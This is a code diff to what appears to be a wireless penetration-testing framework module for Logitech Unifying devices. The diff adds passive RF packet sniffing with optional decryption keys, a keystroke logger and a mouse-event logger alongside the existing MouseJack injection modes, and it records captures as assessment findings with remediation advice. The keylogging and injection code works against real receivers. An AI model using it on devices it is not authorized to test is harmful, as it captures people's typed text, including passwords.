@@ -1,16 +1,19 @@
 """
 Stage 10 — Logitech Unifying / MouseJack
 
-Uses WHAD CLI tools (wuni-scan, wuni-keyboard, wuni-mouse, wanalyze) for all RF
-operations. The dongle device is closed before each subprocess and reopened after,
-following the same pattern as S5 and S7.
+Uses WHAD CLI tools (wuni-scan, wuni-keyboard, wuni-mouse, wanalyze) for RF
+operations involving injection and scanning. Three additional modes use the WHAD
+Python API connectors directly (no CLI subprocess required).
 
 Modes (operator-selectable):
-  sniff    — passive scan for Unifying devices; keylog any detected keyboards;
-              wanalyze keystroke+pairing_cracking pipeline on capture
-  inject   — MouseJack: synchronise and inject keystrokes into a vulnerable receiver
-  ducky    — like inject but plays a DuckyScript file (-d PATH) with locale (-l)
-  mouse    — mouse injection: move + click; supports duplication mode (-d relay)
+  sniff      — passive scan for Unifying devices; keylog any detected keyboards;
+                wanalyze keystroke+pairing_cracking pipeline on capture (CLI)
+  inject     — MouseJack: synchronise and inject keystrokes into a vulnerable receiver
+  ducky      — like inject but plays a DuckyScript file (-d PATH) with locale (-l)
+  mouse      — mouse injection: move + click; supports duplication mode (-d relay)
+  sniffer    — WHAD Python API Sniffer: raw packet capture with optional AES decryption
+  keylogger  — WHAD Python API Keylogger: passive HID keystroke capture
+  mouselogger— WHAD Python API Mouselogger: passive mouse movement/click capture
 """
 
 from __future__ import annotations
@@ -41,6 +44,142 @@ SYNC_TIMEOUT = 12                             # extra seconds for keyboard sync
 
 # wuni-scan output: [014][29:b9:81:2c:a4] 00c2a4... | Mouse (movement)
 _SCAN_LINE = re.compile(r'^\s*\[\d+\]\[([0-9a-f:]+)\]\s+\S+\s+\|\s+(.+)$', re.I)
+
+
+# ---------------------------------------------------------------------------
+# Python-native sniff helpers (whad.unifying connectors, no CLI subprocess)
+# ---------------------------------------------------------------------------
+
+def _python_unifying_sniff(
+    dongle: WhadDongle,
+    duration: int,
+    target_addr: str | None = None,
+) -> list[dict]:
+    """Passive Unifying sniff using whad.unifying.Sniffer Python API.
+
+    Returns list of packet dicts with keys: type, address, channel, payload_hex.
+    Returns empty list if the connector is not importable or fails.
+    """
+    try:
+        from whad.unifying import Sniffer as UniSniffer  # type: ignore[import]
+    except ImportError:
+        return []
+
+    results: list[dict] = []
+    try:
+        sniffer = UniSniffer(dongle.device)
+        if target_addr:
+            try:
+                sniffer.address = target_addr
+            except AttributeError:
+                pass
+        for pkt in sniffer.sniff(timeout=duration):
+            try:
+                results.append({
+                    "type": "unifying",
+                    "address": getattr(pkt, "address", None),
+                    "channel": getattr(pkt, "channel", None),
+                    "payload_hex": bytes(pkt).hex(),
+                })
+            except Exception:  # noqa: BLE001
+                pass
+    except Exception as exc:
+        log.debug(f"[S10] Python Unifying sniffer error: {exc}")
+    return results
+
+
+def _python_unifying_keylog(
+    dongle: WhadDongle,
+    duration: int,
+    target_addr: str | None = None,
+) -> list[str]:
+    """Passive keystroke capture using whad.unifying.Keylogger.
+
+    Returns list of decoded keystroke strings. Empty list on failure.
+    """
+    try:
+        from whad.unifying import Keylogger  # type: ignore[import]
+    except ImportError:
+        return []
+
+    keystrokes: list[str] = []
+    logger = None
+    try:
+        logger = Keylogger(dongle.device)
+        if target_addr:
+            try:
+                logger.address = target_addr
+            except AttributeError:
+                pass
+        logger.start()
+        deadline = time.time() + duration
+        while time.time() < deadline:
+            remaining = deadline - time.time()
+            try:
+                pkt = logger.wait_packet(timeout=min(remaining, 1.0))
+                if pkt is not None:
+                    text = getattr(pkt, "text", None) or getattr(pkt, "key", None)
+                    if text:
+                        keystrokes.append(str(text))
+            except Exception:  # noqa: BLE001
+                break
+    except Exception as exc:
+        log.debug(f"[S10] Python Keylogger error: {exc}")
+    finally:
+        if logger is not None:
+            try:
+                logger.stop()
+            except Exception:  # noqa: BLE001
+                pass
+    return keystrokes
+
+
+def _python_unifying_mouselog(
+    dongle: WhadDongle,
+    duration: int,
+    target_addr: str | None = None,
+) -> list[dict]:
+    """Passive mouse movement capture using whad.unifying.Mouselogger.
+
+    Returns list of movement dicts with dx, dy, buttons keys.
+    """
+    try:
+        from whad.unifying import Mouselogger  # type: ignore[import]
+    except ImportError:
+        return []
+
+    movements: list[dict] = []
+    logger = None
+    try:
+        logger = Mouselogger(dongle.device)
+        if target_addr:
+            try:
+                logger.address = target_addr
+            except AttributeError:
+                pass
+        logger.start()
+        deadline = time.time() + duration
+        while time.time() < deadline:
+            remaining = deadline - time.time()
+            try:
+                pkt = logger.wait_packet(timeout=min(remaining, 1.0))
+                if pkt is not None:
+                    movements.append({
+                        "dx": getattr(pkt, "dx", 0),
+                        "dy": getattr(pkt, "dy", 0),
+                        "buttons": getattr(pkt, "buttons", 0),
+                    })
+            except Exception:  # noqa: BLE001
+                break
+    except Exception as exc:
+        log.debug(f"[S10] Python Mouselogger error: {exc}")
+    finally:
+        if logger is not None:
+            try:
+                logger.stop()
+            except Exception:  # noqa: BLE001
+                pass
+    return movements
 
 
 # ---------------------------------------------------------------------------
@@ -80,8 +219,17 @@ def run(
         _run_ducky_mode(dongle, engagement_id, _iface)
     elif mode == "mouse":
         _run_mouse_mode(dongle, engagement_id, _iface)
+    elif mode == "sniffer":
+        _run_sniffer_mode(dongle, engagement_id)
+    elif mode == "keylogger":
+        _run_keylogger_mode(dongle, engagement_id)
+    elif mode == "mouselogger":
+        _run_mouselogger_mode(dongle, engagement_id)
     else:
-        log.error(f"[S10] Unknown mode '{mode}' — expected sniff/inject/ducky/mouse.")
+        log.error(
+            f"[S10] Unknown mode '{mode}' — expected "
+            "sniff/inject/ducky/mouse/sniffer/keylogger/mouselogger."
+        )
 
 
 # ---------------------------------------------------------------------------
@@ -96,6 +244,32 @@ def _run_sniff_mode(dongle: WhadDongle, engagement_id: str, interface: str) -> N
     time.sleep(0.5)
 
     try:
+        # Attempt Python-native passive sniff + keylog before falling back to CLI.
+        # These run first because they share the same device open handle; the CLI
+        # path below re-uses the device after _reopen_dongle() in the finally block.
+        log.info("[S10][sniff] Trying Python-native Unifying sniffer ...")
+        py_packets = _python_unifying_sniff(dongle, min(SCAN_SECS, 10))
+        if py_packets:
+            log.info(f"[S10][sniff] Python sniffer: {len(py_packets)} packet(s) captured.")
+            for p in py_packets[:5]:
+                log.info(
+                    f"[S10][sniff]   pkt addr={p['address']} ch={p['channel']} "
+                    f"payload={p['payload_hex'][:32]}"
+                )
+        else:
+            log.debug("[S10][sniff] Python sniffer returned no packets.")
+
+        log.info("[S10][sniff] Trying Python-native Unifying keylogger ...")
+        py_keys = _python_unifying_keylog(dongle, min(KL_SECS, 10))
+        if py_keys:
+            log.info(
+                f"[S10][sniff] Python keylogger: {len(py_keys)} keystroke(s) captured."
+            )
+            for k in py_keys[:10]:
+                log.info(f"[S10][sniff]   key: {k}")
+        else:
+            log.debug("[S10][sniff] Python keylogger returned no keystrokes.")
+
         seen = _wuni_scan(SCAN_SECS, interface)
 
         if not seen:
@@ -380,6 +554,247 @@ def _run_mouse_mode(dongle: WhadDongle, engagement_id: str, interface: str) -> N
         mode="mouse", discovered=len(seen), injected=inject_ok,
         method="mouse_dup" if inject_ok else "mouse",
     )
+
+
+# ---------------------------------------------------------------------------
+# Python API sub-modes (whad.unifying Sniffer / Keylogger / Mouselogger)
+# ---------------------------------------------------------------------------
+
+def _run_sniffer_mode(dongle: WhadDongle, engagement_id: str) -> None:
+    """WHAD Python API Sniffer: raw packet capture with optional AES decryption.
+
+    Iterates whad.unifying.Sniffer.sniff() for UNIFYING_SNIFF_SECS seconds.
+    If config.UNIFYING_SNIFFER_KEYS contains hex key strings they are loaded
+    so the sniffer can decrypt encrypted Unifying traffic on the fly.
+    """
+    try:
+        from whad.unifying import Sniffer as _UniSniffer  # type: ignore[import]
+    except ImportError:
+        log.error(
+            "[S10][sniffer] whad.unifying.Sniffer not available — "
+            "ensure WHAD is installed with Unifying support (pip install whad)."
+        )
+        return
+
+    duration = getattr(config, "UNIFYING_SNIFF_SECS", SCAN_SECS)
+    keys: list[str] = getattr(config, "UNIFYING_SNIFFER_KEYS", []) or []
+
+    log.info(f"[S10][sniffer] Starting Unifying sniffer for {duration}s ...")
+
+    try:
+        sniffer = _UniSniffer(dongle.device)
+        sniffer.decrypt = True
+
+        for key_hex in keys:
+            try:
+                key_bytes = bytes.fromhex(key_hex.replace(":", "").replace(" ", ""))
+                sniffer.add_key(key_bytes)
+                log.info(f"[S10][sniffer] Loaded key: {key_hex[:8]}...")
+            except (ValueError, AttributeError) as exc:
+                log.warning(f"[S10][sniffer] Could not load key {key_hex!r}: {exc}")
+
+        try:
+            actions = sniffer.available_actions()
+            log.info(f"[S10][sniffer] Available actions: {actions}")
+        except Exception as exc:  # noqa: BLE001
+            log.debug(f"[S10][sniffer] available_actions() error: {exc}")
+
+        packets: list[str] = []
+        deadline = time.time() + duration
+
+        for pkt in sniffer.sniff():
+            if time.time() >= deadline:
+                break
+            try:
+                hex_repr = bytes(pkt).hex()
+            except Exception:  # noqa: BLE001
+                hex_repr = repr(pkt)
+            packets.append(hex_repr)
+            log.info(f"[S10][sniffer] PKT: {hex_repr}")
+
+        log.info(f"[S10][sniffer] Capture complete — {len(packets)} packet(s) captured.")
+
+        if packets:
+            finding = Finding(
+                type="unifying_raw_packets_captured",
+                severity="medium",
+                target_addr="broadcast",
+                description=(
+                    f"Unifying sniffer captured {len(packets)} raw packet(s) "
+                    f"over {duration}s. Decryption was {'enabled' if sniffer.decrypt else 'disabled'}."
+                ),
+                remediation=(
+                    "Migrate Logitech Unifying peripherals to Logitech Bolt (AES-128 "
+                    "encrypted link layer). Unifying does not provide confidentiality."
+                ),
+                evidence={
+                    "packet_count": len(packets),
+                    "sample_packets": packets[:5],
+                    "keys_loaded": len(keys),
+                    "capture_duration_seconds": duration,
+                },
+                engagement_id=engagement_id,
+            )
+            insert_finding(finding)
+            log.info(
+                f"FINDING [medium] unifying_raw_packets_captured: {len(packets)} packet(s)"
+            )
+
+    except Exception as exc:
+        log.error(f"[S10][sniffer] Sniffer error: {exc}")
+    finally:
+        _reopen_dongle(dongle, getattr(config, "INTERFACE", "uart0"))
+
+    _print_summary(mode="sniffer", discovered=0, injected=False)
+
+
+def _run_keylogger_mode(dongle: WhadDongle, engagement_id: str) -> None:
+    """WHAD Python API Keylogger: passive HID keystroke capture.
+
+    Instantiates whad.unifying.Keylogger and collects decoded keystrokes for
+    UNIFYING_SNIFF_SECS seconds. Creates a critical Finding if any are captured.
+    """
+    try:
+        from whad.unifying import Keylogger as _UniKeylogger  # type: ignore[import]
+    except ImportError:
+        log.error(
+            "[S10][keylogger] whad.unifying.Keylogger not available — "
+            "ensure WHAD is installed with Unifying support (pip install whad)."
+        )
+        return
+
+    duration = getattr(config, "UNIFYING_SNIFF_SECS", SCAN_SECS)
+    log.info(f"[S10][keylogger] Starting Unifying keylogger for {duration}s ...")
+
+    keystrokes: list[str] = []
+
+    try:
+        kl = _UniKeylogger(dongle.device)
+        deadline = time.time() + duration
+
+        for event in kl.run():
+            if time.time() >= deadline:
+                break
+            try:
+                text = str(event)
+            except Exception:  # noqa: BLE001
+                text = repr(event)
+            keystrokes.append(text)
+            log.info(f"[S10][keylogger] KEY: {text}")
+
+        log.info(
+            f"[S10][keylogger] Capture complete — {len(keystrokes)} keystroke(s) captured."
+        )
+
+        if keystrokes:
+            finding = Finding(
+                type="unifying_keystrokes_captured",
+                severity="critical",
+                target_addr="broadcast",
+                description=(
+                    f"Unifying keylogger captured {len(keystrokes)} keystroke(s) "
+                    f"over {duration}s passive RF monitoring. Keystrokes were decoded "
+                    "without pairing or authentication."
+                ),
+                remediation=(
+                    "Replace affected Logitech Unifying keyboards with Logitech Bolt "
+                    "(AES-128 encrypted link layer). No firmware update prevents this."
+                ),
+                evidence={
+                    "keystroke_count": len(keystrokes),
+                    "sample": keystrokes[:20],
+                    "capture_duration_seconds": duration,
+                },
+                engagement_id=engagement_id,
+            )
+            insert_finding(finding)
+            log.info(
+                f"FINDING [critical] unifying_keystrokes_captured: "
+                f"{len(keystrokes)} keystroke(s)"
+            )
+        else:
+            log.info("[S10][keylogger] No keystrokes captured in window.")
+
+    except Exception as exc:
+        log.error(f"[S10][keylogger] Keylogger error: {exc}")
+    finally:
+        _reopen_dongle(dongle, getattr(config, "INTERFACE", "uart0"))
+
+    _print_summary(mode="keylogger", discovered=0, injected=False)
+
+
+def _run_mouselogger_mode(dongle: WhadDongle, engagement_id: str) -> None:
+    """WHAD Python API Mouselogger: passive mouse movement and click capture.
+
+    Instantiates whad.unifying.Mouselogger and collects events for
+    UNIFYING_SNIFF_SECS seconds. Creates a medium Finding if events are captured.
+    """
+    try:
+        from whad.unifying import Mouselogger as _UniMouselogger  # type: ignore[import]
+    except ImportError:
+        log.error(
+            "[S10][mouselogger] whad.unifying.Mouselogger not available — "
+            "ensure WHAD is installed with Unifying support (pip install whad)."
+        )
+        return
+
+    duration = getattr(config, "UNIFYING_SNIFF_SECS", SCAN_SECS)
+    log.info(f"[S10][mouselogger] Starting Unifying mouselogger for {duration}s ...")
+
+    events: list[str] = []
+
+    try:
+        ml = _UniMouselogger(dongle.device)
+        deadline = time.time() + duration
+
+        for event in ml.run():
+            if time.time() >= deadline:
+                break
+            try:
+                summary = str(event)
+            except Exception:  # noqa: BLE001
+                summary = repr(event)
+            events.append(summary)
+            log.info(f"[S10][mouselogger] EVT: {summary}")
+
+        log.info(
+            f"[S10][mouselogger] Capture complete — {len(events)} event(s) captured."
+        )
+
+        if events:
+            finding = Finding(
+                type="unifying_mouse_events_captured",
+                severity="medium",
+                target_addr="broadcast",
+                description=(
+                    f"Unifying mouselogger captured {len(events)} mouse event(s) "
+                    f"(movements/clicks) over {duration}s passive RF monitoring. "
+                    "Mouse events are transmitted in plaintext by Unifying receivers."
+                ),
+                remediation=(
+                    "Replace affected Logitech Unifying mice with Logitech Bolt. "
+                    "Mouse movement data can be used to infer activity patterns."
+                ),
+                evidence={
+                    "event_count": len(events),
+                    "sample_events": events[:10],
+                    "capture_duration_seconds": duration,
+                },
+                engagement_id=engagement_id,
+            )
+            insert_finding(finding)
+            log.info(
+                f"FINDING [medium] unifying_mouse_events_captured: {len(events)} event(s)"
+            )
+        else:
+            log.info("[S10][mouselogger] No mouse events captured in window.")
+
+    except Exception as exc:
+        log.error(f"[S10][mouselogger] Mouselogger error: {exc}")
+    finally:
+        _reopen_dongle(dongle, getattr(config, "INTERFACE", "uart0"))
+
+    _print_summary(mode="mouselogger", discovered=0, injected=False)
 
 
 # ---------------------------------------------------------------------------
